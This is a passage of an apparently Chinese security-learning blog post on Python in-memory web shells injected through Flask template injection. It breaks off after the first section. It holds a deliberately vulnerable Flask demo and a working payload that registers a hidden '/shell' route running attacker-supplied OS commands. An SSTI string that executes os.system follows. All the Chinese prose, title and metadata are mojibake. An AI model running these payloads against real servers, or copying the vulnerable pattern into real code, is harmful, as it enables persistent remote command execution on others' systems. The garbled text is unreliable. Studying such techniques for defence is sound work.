<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π† Â∏∏Áî®ÁöÑPythonÊ°ÜÊû∂ÊúâDjango„ÄÅFlask, Ëøô‰∏§ËÄÖÈÉΩÂèØËÉΩÂ≠òÂú®SSTIÊºèÊ¥û. Python ÂÜÖÂ≠òÈ©¨Âà©Áî®FlaskÊ°ÜÊû∂‰∏≠SSTIÊ≥®ÂÖ•Êù•ÂÆûÁé∞, FlaskÊ°ÜÊû∂‰∏≠Âú®webÂ∫îÁî®Ê®°ÊùøÊ∏≤ÊüìÁöÑËøáÁ®ã‰∏≠Áî®Âà∞render_template_stringËøõË°åÊ∏≤Êüì, ‰ΩÜÊú™ÂØπÁî®Êà∑‰º†ËæìÁöÑ‰ª£Á†ÅËøõË°åËøáÊª§ÂØºËá¥Áî®Êà∑ÂèØ‰ª•ÈÄöËøáÊ≥®ÂÖ•ÊÅ∂ÊÑè‰ª£Á†ÅÊù•ÂÆûÁé∞PythonÂÜÖÂ≠òÈ©¨ÁöÑÊ≥®ÂÖ•.\n">
<title>pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†</title>

<link rel='canonical' href='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/'>

<link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†">
<meta property='og:description' content="pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π† Â∏∏Áî®ÁöÑPythonÊ°ÜÊû∂ÊúâDjango„ÄÅFlask, Ëøô‰∏§ËÄÖÈÉΩÂèØËÉΩÂ≠òÂú®SSTIÊºèÊ¥û. Python ÂÜÖÂ≠òÈ©¨Âà©Áî®FlaskÊ°ÜÊû∂‰∏≠SSTIÊ≥®ÂÖ•Êù•ÂÆûÁé∞, FlaskÊ°ÜÊû∂‰∏≠Âú®webÂ∫îÁî®Ê®°ÊùøÊ∏≤ÊüìÁöÑËøáÁ®ã‰∏≠Áî®Âà∞render_template_stringËøõË°åÊ∏≤Êüì, ‰ΩÜÊú™ÂØπÁî®Êà∑‰º†ËæìÁöÑ‰ª£Á†ÅËøõË°åËøáÊª§ÂØºËá¥Áî®Êà∑ÂèØ‰ª•ÈÄöËøáÊ≥®ÂÖ•ÊÅ∂ÊÑè‰ª£Á†ÅÊù•ÂÆûÁé∞PythonÂÜÖÂ≠òÈ©¨ÁöÑÊ≥®ÂÖ•.\n">
<meta property='og:url' content='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/'>
<meta property='og:site_name' content='ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ÂÜÖÂ≠òÈ©¨' /><meta property='article:tag' content='flask' /><meta property='article:tag' content='tornado' /><meta property='article:tag' content='django' /><meta property='article:tag' content='pyramid' /><meta property='article:published_time' content='2025-04-16T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-16T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.webp' />
<meta name="twitter:title" content="pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†">
<meta name="twitter:description" content="pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π† Â∏∏Áî®ÁöÑPythonÊ°ÜÊû∂ÊúâDjango„ÄÅFlask, Ëøô‰∏§ËÄÖÈÉΩÂèØËÉΩÂ≠òÂú®SSTIÊºèÊ¥û. Python ÂÜÖÂ≠òÈ©¨Âà©Áî®FlaskÊ°ÜÊû∂‰∏≠SSTIÊ≥®ÂÖ•Êù•ÂÆûÁé∞, FlaskÊ°ÜÊû∂‰∏≠Âú®webÂ∫îÁî®Ê®°ÊùøÊ∏≤ÊüìÁöÑËøáÁ®ã‰∏≠Áî®Âà∞render_template_stringËøõË°åÊ∏≤Êüì, ‰ΩÜÊú™ÂØπÁî®Êà∑‰º†ËæìÁöÑ‰ª£Á†ÅËøõË°åËøáÊª§ÂØºËá¥Áî®Êà∑ÂèØ‰ª•ÈÄöËøáÊ≥®ÂÖ•ÊÅ∂ÊÑè‰ª£Á†ÅÊù•ÂÆûÁé∞PythonÂÜÖÂ≠òÈ©¨ÁöÑÊ≥®ÂÖ•.\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://0d000721999.github.io/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.webp' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "light");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="ÂàáÊç¢ËèúÂçï">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu988272603220494224.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üòã</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">ÁæéÂíïÂôúÁöÑÂ∞èÁ´ô</a></h1>
            <h2 class="site-description">CialloÔΩû(‚à†„Éªœâ&lt; )‚åí‚òÖ</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://buuoj.cn/users/175721'
                        target="_blank"
                        title="BUUOJ"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-letter-b" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M7 20v-16h6a4 4 0 0 1 0 8a4 4 0 0 1 0 8h-6" />
  <line x1="7" y1="12" x2="13" y2="12" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/0d000721999'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>‰∏ªÈ°µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>ÂÖ≥‰∫é</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ÁõÆÂΩï</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#ËÄÅÁâàflaskÂÜÖÂ≠òÈ©¨">ËÄÅÁâàflaskÂÜÖÂ≠òÈ©¨</a>
      <ol>
        <li><a href="#flask-ËØ∑Ê±Ç‰∏ä‰∏ãÊñáÁÆ°ÁêÜÊú∫Âà∂">Flask ËØ∑Ê±Ç‰∏ä‰∏ãÊñáÁÆ°ÁêÜÊú∫Âà∂</a></li>
        <li><a href="#ÊºèÊ¥ûÁéØÂ¢É">ÊºèÊ¥ûÁéØÂ¢É</a></li>
        <li><a href="#payloadÂàÜÊûê">payloadÂàÜÊûê</a></li>
        <li><a href="#sysmodules">sys.modules</a></li>
        <li><a href="#bypassÊñπÊ≥ï">bypassÊñπÊ≥ï</a></li>
      </ol>
    </li>
    <li><a href="#Êñ∞ÁâàflaskÂÜÖÂ≠òÈ©¨">Êñ∞ÁâàflaskÂÜÖÂ≠òÈ©¨</a>
      <ol>
        <li><a href="#before_request">before_request</a></li>
        <li><a href="#after_request">after_request</a></li>
        <li><a href="#errorhandler">errorhandler</a></li>
        <li><a href="#ËøòÊòØÂà©Áî®add_url_rule">ËøòÊòØÂà©Áî®add_url_rule</a></li>
      </ol>
    </li>
    <li><a href="#tornado">Tornado</a></li>
    <li><a href="#django">Django</a></li>
    <li><a href="#pyramid">pyramid</a>
      <ol>
        <li><a href="#Á¨¨‰∏ÄÂ±äÂõΩÂüéÊùØez_gallery">Á¨¨‰∏ÄÂ±äÂõΩÂüéÊùØez_Gallery</a>
          <ol>
            <li><a href="#xiapao">xiapao</a></li>
            <li><a href="#pyramidÈí©Â≠êÂáΩÊï∞">pyramidÈí©Â≠êÂáΩÊï∞</a></li>
            <li><a href="#Âà©Áî®headerÂ§¥Â§ñÂ∏¶ÂõûÊòæ">Âà©Áî®headerÂ§¥Â§ñÂ∏¶ÂõûÊòæ</a></li>
          </ol>
        </li>
        <li><a href="#httpÈîôËØØÂõûÊòæ">HTTPÈîôËØØÂõûÊòæ</a>
          <ol>
            <li><a href="#500Áä∂ÊÄÅÁ†Å">500Áä∂ÊÄÅÁ†Å</a></li>
            <li><a href="#404Áä∂ÊÄÅÁ†Å">404Áä∂ÊÄÅÁ†Å</a></li>
          </ol>
        </li>
        <li><a href="#Âº∫ÁΩëÊùØÂÜ≥Ëµõpyramid">Âº∫ÁΩëÊùØÂÜ≥Ëµõpyramid</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
                <img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.webp"
                        
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/python/" style="background-color: #2a9d8f; color: #fff;">
                Python
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 16, 2025</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    ÈòÖËØªÊó∂Èïø: 16 ÂàÜÈíü
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†">pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†
</h1><p>Â∏∏Áî®ÁöÑ<code>Python</code>Ê°ÜÊû∂Êúâ<code>Django</code>„ÄÅ<code>Flask</code>, Ëøô‰∏§ËÄÖÈÉΩÂèØËÉΩÂ≠òÂú®<code>SSTI</code>ÊºèÊ¥û. <code>Python ÂÜÖÂ≠òÈ©¨</code>Âà©Áî®<code>Flask</code>Ê°ÜÊû∂‰∏≠<code>SSTI</code>Ê≥®ÂÖ•Êù•ÂÆûÁé∞, <code>Flask</code>Ê°ÜÊû∂‰∏≠Âú®<code>web</code>Â∫îÁî®Ê®°ÊùøÊ∏≤ÊüìÁöÑËøáÁ®ã‰∏≠Áî®Âà∞<code>render_template_string</code>ËøõË°åÊ∏≤Êüì, ‰ΩÜÊú™ÂØπÁî®Êà∑‰º†ËæìÁöÑ‰ª£Á†ÅËøõË°åËøáÊª§ÂØºËá¥Áî®Êà∑ÂèØ‰ª•ÈÄöËøáÊ≥®ÂÖ•ÊÅ∂ÊÑè‰ª£Á†ÅÊù•ÂÆûÁé∞<code>Python</code>ÂÜÖÂ≠òÈ©¨ÁöÑÊ≥®ÂÖ•.</p>
<h2 id="ËÄÅÁâàflaskÂÜÖÂ≠òÈ©¨">ËÄÅÁâàflaskÂÜÖÂ≠òÈ©¨
</h2><h3 id="flask-ËØ∑Ê±Ç‰∏ä‰∏ãÊñáÁÆ°ÁêÜÊú∫Âà∂">Flask ËØ∑Ê±Ç‰∏ä‰∏ãÊñáÁÆ°ÁêÜÊú∫Âà∂
</h3><p>ÂΩìÁΩëÈ°µËØ∑Ê±ÇËøõÂÖ•<code>Flask</code>Êó∂, ‰ºöÂÆû‰æãÂåñ‰∏Ä‰∏™<code>Request Context</code>. Âú®<code>Python</code>‰∏≠ÂàÜÂá∫‰∫Ü‰∏§Áßç‰∏ä‰∏ãÊñá: ËØ∑Ê±Ç‰∏ä‰∏ãÊñá(request context)„ÄÅÂ∫îÁî®‰∏ä‰∏ãÊñá(session context). ‰∏Ä‰∏™ËØ∑Ê±Ç‰∏ä‰∏ãÊñá‰∏≠Â∞ÅË£Ö‰∫ÜËØ∑Ê±ÇÁöÑ‰ø°ÊÅØ, ËÄå‰∏ä‰∏ãÊñáÁöÑÁªìÊûÑÊòØËøêÁî®‰∫Ü‰∏Ä‰∏™<code>Stack</code>ÁöÑÊ†àÁªìÊûÑ, ‰πüÂ∞±ÊòØËØ¥ÂÆÉÊã•Êúâ‰∏Ä‰∏™Ê†àÊâÄÊã•ÊúâÁöÑÂÖ®ÈÉ®ÁâπÊÄß. <code>request context</code>ÂÆû‰æãÂåñÂêé‰ºöË¢´<code>push</code>Âà∞Ê†à<code>_request_ctx_stack</code>‰∏≠, Âü∫‰∫éÊ≠§ÁâπÊÄß‰æøÂèØ‰ª•ÈÄöËøáËé∑ÂèñÊ†àÈ°∂ÂÖÉÁ¥†ÁöÑÊñπÊ≥ïÊù•Ëé∑ÂèñÂΩìÂâçÁöÑËØ∑Ê±Ç.</p>
<h3 id="ÊºèÊ¥ûÁéØÂ¢É">ÊºèÊ¥ûÁéØÂ¢É
</h3><p>flaskÂÜôSSTI-demo</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>  <span class="c1"># put application&#39;s code here</span>
</span></span><span class="line"><span class="cl">    <span class="n">person</span> <span class="o">=</span> <span class="s1">&#39;knave&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">person</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h1&gt;Hi, </span><span class="si">%s</span><span class="s1">.&lt;/h1&gt;&#39;</span> <span class="o">%</span> <span class="n">person</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂéüÂßã<code>Flask</code>ÂÜÖÂ≠òÈ©¨<code>Payload</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&#34;,{&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="payloadÂàÜÊûê">payloadÂàÜÊûê
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;app.add_url_rule(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;/shell&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;shell&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="k">lambda</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">_request_ctx_stack</span><span class="o">.</span><span class="n">top</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;whoami&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span><span class="s2">&#34;,</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;_request_ctx_stack&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;current_app&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>url_for</code>ÊòØ<code>Flask</code>ÁöÑ‰∏Ä‰∏™ÂÜÖÁΩÆÂáΩÊï∞, ÈÄöËøá<code>Flask</code>ÂÜÖÁΩÆÂáΩÊï∞ÂèØ‰ª•Ë∞ÉÁî®ÂÖ∂<code>__globals__</code>Â±ûÊÄß, ËØ•ÁâπÊÆäÂ±ûÊÄßËÉΩÂ§üËøîÂõûÂáΩÊï∞ÊâÄÂú®Ê®°ÂùóÂëΩÂêçÁ©∫Èó¥ÁöÑÊâÄÊúâÂèòÈáè, ÂÖ∂‰∏≠ÂåÖÂê´‰∫ÜÂæàÂ§öÂ∑≤ÁªèÂºïÂÖ•ÁöÑ<code>modules</code>, ÂèØ‰ª•ÁúãÂà∞ËøôÈáåÊòØÊîØÊåÅ<code>__builtins__</code>ÁöÑ.</p>
<p>Âú®<code>__builtins__</code>Ê®°Âùó‰∏≠, <code>Python</code>Âú®ÂêØÂä®Êó∂Â∞±Áõ¥Êé•‰∏∫Êàë‰ª¨ÂØºÂÖ•‰∫ÜÂæàÂ§öÂÜÖÂª∫ÂáΩÊï∞. ÂáÜÁ°ÆÁöÑËØ¥, <code>Python</code>Âú®ÂêØÂä®Êó∂‰ºöÈ¶ñÂÖàÂä†ËΩΩÂÜÖÂª∫ÂêçÁß∞Á©∫Èó¥, ÂÜÖÂª∫ÂêçÁß∞Á©∫Èó¥‰∏≠ÊúâËÆ∏Â§öÂêçÂ≠óÂà∞ÂØπË±°‰πãÈó¥ÁöÑÊò†Â∞Ñ, Ëøô‰∫õÂêçÂ≠óÂ∞±ÊòØÂÜÖÂª∫ÂáΩÊï∞ÁöÑÂêçÁß∞, ÂØπË±°Â∞±ÊòØËøô‰∫õÂÜÖÂª∫ÂáΩÊï∞ÂØπË±°. ÂèØ‰ª•ÁúãÂà∞, Âú®<code>__builtins__</code>Ê®°ÂùóÁöÑÂÜÖÂª∫ÂáΩÊï∞‰∏≠ÊòØÂ≠òÂú®<code>eval</code>„ÄÅ<code>exec</code>Á≠âÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÁöÑ.</p>
<p>Áî±‰∫éÂ≠òÂú®ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞, Âõ†Ê≠§Êàë‰ª¨Â∞±ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞Êù•ÊâßË°åÂç±Èô©Êìç‰Ωú, <code>Exploit</code>Â¶Ç‰∏ã:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).system(&#39;open -a Calculator&#39;)&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
